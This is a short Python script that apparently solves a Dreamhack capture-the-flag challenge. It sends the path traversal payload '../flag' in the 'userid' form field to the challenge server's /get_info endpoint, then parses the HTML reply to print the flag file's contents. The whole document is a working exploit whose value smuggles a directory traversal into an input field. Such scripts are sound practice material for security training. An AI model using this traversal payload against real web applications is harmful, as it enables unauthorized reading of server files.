from bs4 import BeautifulSoup
import requests

URL = "http://host1.dreamhack.games:17959"
GET_INFO_URI = "/get_info"
PAYLOAD = "../flag"
DATA = {'userid': PAYLOAD}

resp = requests.post(URL + GET_INFO_URI, data=DATA)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('pre')
flag = pre.contents[0]
print(flag)